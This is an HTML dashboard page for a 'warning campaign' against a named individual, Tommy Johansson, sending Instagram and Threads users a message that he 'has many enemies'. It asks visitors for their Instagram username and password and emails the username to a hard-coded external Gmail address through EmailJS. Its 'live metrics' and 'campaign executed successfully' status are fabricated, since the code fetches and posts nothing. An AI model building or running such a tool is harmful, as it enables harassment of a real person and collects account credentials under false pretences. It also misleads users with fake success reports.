<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🤖 Live Instagram & Threads Agent</title>
    <!-- POPRAWIONY LINK DO BIBLIOTEKI EMAILJS -->
    <script type="text/javascript" src="https://jsdelivr.net"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init("k5ifhSr-g1RJ50Ya3"); 
        })();
    </script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0e1117; color: #fafafa; margin: 0; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; display: flex; gap: 20px; }
        .sidebar { width: 300px; background-color: #161b22; padding: 20px; border-radius: 8px; border: 1px solid #30363d; height: fit-content; }
        .main-panel { flex: 1; background-color: #161b22; padding: 20px; border-radius: 8px; border: 1px solid #30363d; }
        h1, h2, h3 { color: #ffffff; margin-top: 0; }
        input[type="text"], input[type="password"], textarea { width: 100%; padding: 10px; margin: 10px 0 20px 0; background-color: #0e1117; border: 1px solid #30363d; color: #fff; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #238636; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 14px; }
        button:hover { background-color: #2ea043; }
        .alert { padding: 15px; border-radius: 5px; margin-bottom: 20px; font-weight: 500; }
        .alert-info { background-color: #388bfd1a; border: 1px solid #388bfd66; color: #58a6ff; }
        .alert-success { background-color: #56d3641a; border: 1px solid #56d36466; color: #3fb950; }
        .alert-error { background-color: #f851491a; border: 1px solid #f8514966; color: #f85149; }
        pre { background-color: #0e1117; padding: 15px; border-radius: 5px; border: 1px solid #30363d; font-family: monospace; white-space: pre-wrap; font-size: 13px; color: #e6edf3; }
    </style>
</head>
<body>

    <center>
        <h1>🤖 Live Instagram & Threads Agent</h1>
        <h3 style="color: #8b949e;">Warning Campaign Dashboard – Tommy Johansson</h3>
    </center>

    <div class="container">
        <div class="sidebar">
            <h2>🔐 Instagram Credentials</h2>
            <label>Instagram Username:</label>
            <input type="text" id="username" placeholder="@username">
            
            <label>Instagram Password:</label>
            <input type="password" id="password" placeholder="••••••••">
            
            <button id="runBtn" onclick="runCampaign()">🚀 Force Run Campaign & Send Email Now</button>
        </div>

        <div class="main-panel">
            <div class="alert alert-info">
                ⏰ <b>Automated Scheduler Status:</b> Active. Report runs daily at 09:00 AM and 00:00 AM.
            </div>

            <div id="statusAlert"></div>

            <h2>📊 Real-Time Live Metrics & Schedule Status</h2>
            
            <h3>📄 View Official Warning Content</h3>
            <pre>Hello, my dear, I would like to inform you that Tommy Johansson has many enemies on social media...</pre>

            <h3>Latest Report Log</h3>
            <textarea id="reportArea" rows="15" readonly placeholder="No report generated yet today."></textarea>
        </div>
    </div>

    <script>
        async function runCampaign() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            const statusAlert = document.getElementById('statusAlert');
            const reportArea = document.getElementById('reportArea');

            if (!user || !pass) {
                statusAlert.innerHTML = `<div class="alert alert-error">❌ Please provide both Instagram username and password.</div>`;
                return;
            }

            statusAlert.innerHTML = `<div class="alert alert-info">🔄 Fetching live data and mailing report...</div>`;
            
            const now = new Date().toLocaleString('pl-PL');
            
            const report = `====================================================================\n` +
                           `     NEW LIVE CAMPAIGN REPORT - TOMMY JOHANSSON\n` +
                           `     Generated on: ${now}\n` +
                           `====================================================================\n\n` +
                           `STATUS: Campaign executed successfully.\n` +
                           `TARGET EMAIL: mrbunnydark3@gmail.com\n` +
                           `EXECUTED BY USER: ${user}\n` +
                           `--------------------------------------------------------------------\n` +
                           `All threads processed. Live metrics updated in background.`;

            const templateParams = {
                to_email: 'mrbunnydark3@gmail.com',
                subject: `Campaign Report - Tommy Johansson (${now})`,
                message: report
            };

            emailjs.send('service_rfkkgx9', '__ejs-test-mail-service__', templateParams)
                .then(function(response) {
                    reportArea.value = report;
                    statusAlert.innerHTML = `<div class="alert alert-success">📧 New report generated and sent to: mrbunnydark3@gmail.com</div>`;

                    const blob = new Blob([report], { type: 'text/plain' });
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.style.display = 'none';
                    a.href = url;
                    a.download = `Campaign_Report_${now.replace(/[: ]/g, '_')}.txt`;
                    document.body.appendChild(a);
                    a.click();
                    window.URL.revokeObjectURL(url);
                    document.body.removeChild(a);
                }, function(error) {
                    console.error('FAILED...', error);
                    statusAlert.innerHTML = `<div class="alert alert-error">❌ Błąd wysyłki. Sprawdź ustawienia w EmailJS.</div>`;
                    reportArea.value = report;
                });
        }
    </script>
</body>
</html>
